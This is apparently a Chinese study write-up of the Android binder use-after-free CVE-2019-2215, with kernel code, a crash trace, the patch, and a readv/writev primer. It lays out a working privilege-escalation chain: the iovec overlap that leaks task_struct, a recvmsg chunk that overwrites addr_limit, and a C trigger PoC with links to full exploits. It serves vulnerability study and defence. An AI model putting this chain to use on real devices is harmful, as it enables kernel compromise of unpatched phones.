## 基本信息
- patch: https://android-review.googlesource.com/c/kernel/common/+/609868/2/drivers/android/binder.c#4542
- KASAN  UAF crash
https://bugs.chromium.org/p/project-zero/issues/detail?id=1942#c7
- poc
https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885  
https://github.com/grant-h/qu1ckr00t


## 漏洞点 & POC
在`drivers/android/binder.c`中的binder_thread结构体中，有`wait_queue_head_t`的结构体
```
struct binder_thread {
        struct binder_proc *proc;
        struct rb_node rb_node;
        struct list_head waiting_thread_node;
        int pid;
        int looper;              /* only modified by this thread */
        bool looper_need_return; /* can be written by other thread */
        struct binder_transaction *transaction_stack;
        struct list_head todo;
        bool process_todo;
        struct binder_error return_error;
        struct binder_error reply_error;
        wait_queue_head_t wait;
        struct binder_stats stats;
        atomic_t tmp_ref;
        bool is_dead;
        struct task_struct *task;
};
```
```
struct __wait_queue_head {
        spinlock_t              lock;
        struct list_head        task_list;
};
typedef struct __wait_queue_head wait_queue_head_t;
```

> The BINDER_THREAD_EXIT ioctl calls the binder_thread_release function which frees the binder_thread struct. However, if epoll is called on this thread, binder_poll tells epoll to use wait, the wait queue that is embedded in the binder_thread struct. Therefore, when the binder_thread struct is freed, epoll is pointing to the now freed wait queue. Normally, the wait queue used for polling on a file is guaranteed to be alive until the file’s release handler is called. Rare cases require the use of POLLFREE. In contrast, the Binder driver only worked if you constantly removed and re-added the epoll watch. This is the underlying bug and the use-after-free is a symptom of that.

当使用epoll的线程调用`BINDER_THREAD_EXIT`的时候，`binder_thread`被释放。但是当进程结束或epoll主动调用`EPOLL_CTL_DEL`时，将会遍历到释放掉的binder_thread中的wait，导致`wait`的UAF

BINDER_THREAD_EXIT的ioctl处理如下
```
static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
	// [...]
    
    switch (cmd) {
	// [...]
	case BINDER_THREAD_EXIT:
		binder_debug(BINDER_DEBUG_THREADS, "%d:%d exit\n",
			     proc->pid, thread->pid);
		binder_free_thread(proc, thread);
		thread = NULL;
		break;
     // [...]
    }
}

// [...]

static int binder_free_thread(struct binder_proc *proc,
			      struct binder_thread *thread)
{
	struct binder_transaction *t;
	struct binder_transaction *send_reply = NULL;
	int active_transactions = 0;

	// [...]
    
	while (t) {
		active_transactions++;
		// [...]
	}
	if (send_reply)
		binder_send_failed_reply(send_reply, BR_DEAD_REPLY);
	binder_release_work(&thread->todo);
	kfree(thread);  // !
	binder_stats_deleted(BINDER_STAT_THREAD);
	return active_transactions;
}
```
此处的`kfree(thread);`是第一次free。

通过KASN得到的free后use的调用链
```
Call Trace:
  ...
  _raw_spin_lock_irqsave+0x96/0xc0 kernel/locking/spinlock.c:159
  remove_wait_queue+0x81/0x350 kernel/sched/wait.c:50
  ep_remove_wait_queue fs/eventpoll.c:595 [inline]
  ep_unregister_pollwait.isra.7+0x18c/0x590 fs/eventpoll.c:613
  ep_free+0x13f/0x320 fs/eventpoll.c:830
  ep_eventpoll_release+0x44/0x60 fs/eventpoll.c:862
  ...
```
从`ep_unregister_pollwait`函数跟入
```
static void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)
{
	struct list_head *lsthead = &epi->pwqlist;
	struct eppoll_entry *pwq;

	while (!list_empty(lsthead)) {
		pwq = list_first_entry(lsthead, struct eppoll_entry, llink);

		list_del(&pwq->llink);
		ep_remove_wait_queue(pwq);
		kmem_cache_free(pwq_cache, pwq);
	}
}
```
`ep_remove_wait_queue`函数会判断RCU锁([RCU的简介](https://www.ibm.com/developerworks/cn/linux/l-rcu/index.html))，而后进入`remove_wait_queue`将wait摘链。
```
static void ep_remove_wait_queue(struct eppoll_entry *pwq)
{
	wait_queue_head_t *whead;

	rcu_read_lock();
	/*
	 * If it is cleared by POLLFREE, it should be rcu-safe.
	 * If we read NULL we need a barrier paired with
	 * smp_store_release() in ep_poll_callback(), otherwise
	 * we rely on whead->lock.
	 */
	whead = smp_load_acquire(&pwq->whead);
	if (whead)
		remove_wait_queue(whead, &pwq->wait);
	rcu_read_unlock();
}
```
remove_wait_queue函数
```c
void remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)
{
        unsigned long flags;
        spin_lock_irqsave(&q->lock, flags);
        __remove_wait_queue(q, wait);
        spin_unlock_irqrestore(&q->lock, flags);
}

void __remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)
{
        list_del(&old->task_list);
}
```
其中，q此时是指向binder_thread中的`wait`
list_del的逻辑是修改entry的next->prev和prev->next，然后把next和prev设置为指向`POISON`。

```
static inline void list_del(struct list_head *entry)
{
	__list_del(entry->prev, entry->next);
	entry->next = LIST_POISON1;
	entry->prev = LIST_POISON2;
}
// ...
static inline void __list_del(struct list_head * prev, struct list_head * next)
{
	next->prev = prev;
	WRITE_ONCE(prev->next, next);
}
```
为了修改UAF的对象，我们可以用`iovec`结构体。(原理见下文readv)
```
struct iovec{
     void *iov_base; /* Pointer to data. */
     size_t iov_len; /* Length of data. */
};
```
由于kernel会检查传入的iov_base。我们需要先通过内核的iov_base的检查，然后通过UAF修改iov_bases为内核指针，就能泄露内核地址了。

`binder_thread`结构体为408字节，一个iovec为16字节，所以我们需要25个iovec。
布置结构如下
| binder_thread struct | iovec array |
| :-: | :-: |
| 0x00 | 0x00: iovec[0].iov_base |
| ... | iovec[0].iov_len |
| ... | ... |
| 0xA0: wait.lock | 0xA0: iovec[10].iov_base |
| 0xA8: wait.task_list.next | 0xA8: iovec[10].iov_len |
| 0xB0: wait.task_list.prev | 0xB0: iovec[11].iov_base |
| ... | ... |

当vectored I/O把我们的iovec结构体拷贝到内核内存的时候(此时iovbase已经通过检测)，我们希望这个时候IO阻塞，这样就有机会来改写已经在内核内存中的iov_base指针了。我们用另一个线程触发UAF. 这样ep_remove_wait_queue中的list_del。


>  在`CONFIG_DEBUG_LIST `开启的时候，这个改写会失效，此时有`prev->next == entry && next->prev == entry`检测。
```
void __list_del_entry(struct list_head *entry)
{
        struct list_head *prev, *next;

        prev = entry->prev;
        next = entry->next;

        if (WARN(next == LIST_POISON1,
                "list_del corruption, %p->next is LIST_POISON1 (%p)\n",
                entry, LIST_POISON1) ||
            WARN(prev == LIST_POISON2,
                "list_del corruption, %p->prev is LIST_POISON2 (%p)\n",
                entry, LIST_POISON2) ||
            WARN(prev->next != entry,
                "list_del corruption. prev->next should be %p, "
                "but was %p\n", entry, prev->next) ||
            WARN(next->prev != entry,
                "list_del corruption. next->prev should be %p, "
                "but was %p\n", entry, next->prev)) {
                BUG_ON(PANIC_CORRUPTION);
                return;
        }

        __list_del(prev, next);
}
EXPORT_SYMBOL(__list_del_entry);
```
在list_del操作前，wait_queue的链是这样的。其中`0xDEADBEEF`和`0x1000`分别是两个`LIST_POISON`。
![](https://upload-images.jianshu.io/upload_images/13348817-05463fba308e3eaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

在list_del后, list_head的prev和next都指向了自己，即此时`iovec[11].iov_base`被改写为了内核地址（ list_head ，即 binder_thread + 0xa8 ）。
![](https://upload-images.jianshu.io/upload_images/13348817-e66228aea8f0b81b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

而后通过`writev`来泄露binder_thread 。（在此之前，先向Pipe中写入数据解除writev的阻塞）
由于task_struct 指针在binder_thread + 0x190，此时我们也即泄露出了task_struct指针。

![](https://upload-images.jianshu.io/upload_images/13348817-53e509d39e1dbcab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### Overwriting the Address Limit
由于知道了`task_struct`指针，我们可以再次利用UAF修改address limit ，即task_struct + 0x08。
此处利用`recvmsg`：
我们将从 unix domain socket 读入数据存放到scatter I/O中分散的buffer，每当填充完一个buffer后，指向下一个buffer继续填充。在list_del之后，scatter I/O准备将数据放入`iovec[11].iov_base`。`iovec[11].iov_base`在list_del后，指向`wait_queue`的`list head`.  我们希望把`iovec[12].iov_base`设置为addr_limit的地址以完成overwrite
我们将`iovec[11].iov_len`设置为0x28，这是`iovec[10].iov_len`, `iovec[11].iov_base`, `iovec[11].iov_len`, `iovec[12].iov_base`, `iovec[12].iovec_len`5个元素的长度。

将addr_limit 改为0xFFFFFFFFFFFFFFFE， 比`KERNEL_DS`小1，来绕过iov_iter_init()中的segment_eq(get_fs(), KERNEL_DS)分支

块构造如下
```
  unsigned long second_write_chunk[] = {
    1, /* iov_len */ (already used) */
    0xdeadbeef, /* iov_base (already used) */
    0x8 + 2 * 0x10, /* iov_len (already used) */
    current_ptr + 0x8, /* next iov_base (addr_limit) */
    8, /* next iov_len (sizeof(addr_limit)) */
    0xfffffffffffffffe /* value to write - new addr_limit */
  };
```

| Values after list_del operation, prior to recvmsg | Values after recvmsg |
| :-: | :-: |
| 0x00 | 0x00 |
| ... | ... |
| 0xA8: iovec[10].iov_len (+0xA8 (points to itself)) | 0xA8: iovec[10].iov_len (1) |
| 0xB0: iovec[11].iov_base (+0xA8 (points to previous element)) | 0xB0: iovec[11].iov_base (0xDEADBEEF) |
| 0xB8: iovec[11].iov_len (0x28) | 0xB8: iovec[11].iov_len (0x28) |
| 0xC0: iovec[12].iov_base (0xBEEFDEAD) | 0xC0: iovec[12].iov_base (task_struct + 0x8) |
|0xC8: iovec[12].iov_len (0x8) | 0xC8: iovec[12].iov_len (0x8)|
![](https://upload-images.jianshu.io/upload_images/13348817-ab024dbeab9e6d4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

将address limit修改为0xfffffffffffffffe后，我们就有任意地址读写的能力了。


poc
```

#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BINDER_THREAD_EXIT 0x40046208ul

int main()
{
        int fd, epfd;
        struct epoll_event event = { .events = EPOLLIN };
                
        fd = open("/dev/binder", O_RDONLY);
        epfd = epoll_create(1000);
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
        ioctl(fd, BINDER_THREAD_EXIT, NULL);
}
```


exp：
https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885
(仅限3.4的内核)


### readv/writev
https://blog.csdn.net/weixin_36750623/article/details/84579243

#### 为什么引出readv()和writev()
因为使用`read()`将数据读到不连续的内存、使用`write()`将不连续的内存发送出去，要经过多次的调用read, write
如果要从文件中读一片连续的数据至进程的不同区域，有两种方案：①使用read()一次将它们读至一个较大的缓冲区中，然后将它们分成若干部分复制到不同的区域； ②调用read()若干次分批将它们读至不同区域。
同样，如果想将程序中不同区域的数据块连续地写至文件，也必须进行类似的处理。
怎么解决多次系统调用+拷贝带来的开销呢？
`readv()`和`writev()`只需一次系统调用就可以实现在文件和进程的多个缓冲区之间传送数据，免除了多次系统调用或复制数据的开销。

### 使用
在一次函数调用中：
① writev以顺序iov[0]、iov[1]至iov[iovcnt-1]从各缓冲区中聚集输出数据到fd  
② readv则将从fd读入的数据按同样的顺序散布到各缓冲区中，readv总是先填满一个缓冲区，然后再填下一个  
```
#include <sys/uio.h>
ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
struct iovec {
    void  *iov_base;    /* Starting address */
    size_t iov_len;     /* Number of bytes to transfer */
};
```
(1) 参数：`readv`和`writev`的第一个参数`fd`是个文件描述符，第二个参数是指向`iovec`数据结构的一个指针，其中`iov_base`为缓冲区首地址，`iov_len`为缓冲区长度，参数`iovcnt`指定了`iovec`的个数。  
(2) 返回值：函数调用成功时返回读、写的总字节数，失败时返回-1并设置相应的`errno`。

## murmur
第三方适配的系统中  
(华为的可以在此下载https://consumer.huawei.com/en/opensource/detail/?siteCode=worldwide&productCode=Smartphones&fileType=openSourceSoftware&pageSize=10&curPage=1)
，vivo中`binder_thread`结构体内没有task_struct指针，无法直接修改addr_limit
```
struct binder_thread {
    struct binder_proc *proc;
    struct rb_node rb_node;
    int pid;
    int looper;
    struct binder_transaction *transaction_stack;
    struct list_head todo;
    uint32_t return_error; /* Write failed, return error code in read buf */
    uint32_t return_error2; /* Write failed, return error code in read */
                            /* buffer. Used when sending a reply to a dead process that */
                            /* we are also waiting on */
    wait_queue_head_t wait;
    struct binder_stats stats;
#ifdef BINDER_PERF_EVAL
        struct binder_timeout_stats to_stats;
#endif
};
```


## 补丁
在binder_thread释放前，前清理thread->wait即可。
```
diff --git a/drivers/android/binder.c b/drivers/android/binder.c
index a340766..2ef8bd2 100644
--- a/drivers/android/binder.c
+++ b/drivers/android/binder.c
@@ -4302,6 +4302,18 @@ static int binder_thread_release(struct binder_proc *proc,
                 if (t)
                         spin_lock(&t->lock);
         }
+
+        /*
+         * If this thread used poll, make sure we remove the waitqueue
+         * from any epoll data structures holding it with POLLFREE.
+         * waitqueue_active() is safe to use here because we're holding
+         * the inner lock.
+         */
+        if ((thread->looper & BINDER_LOOPER_STATE_POLL) &&
+            waitqueue_active(&thread->wait)) {
+                wake_up_poll(&thread->wait, POLLHUP | POLLFREE);
+        }
+
         binder_inner_proc_unlock(thread->proc);
  
         if (send_reply)
```

## 参考
https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html  
https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/  
http://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/  
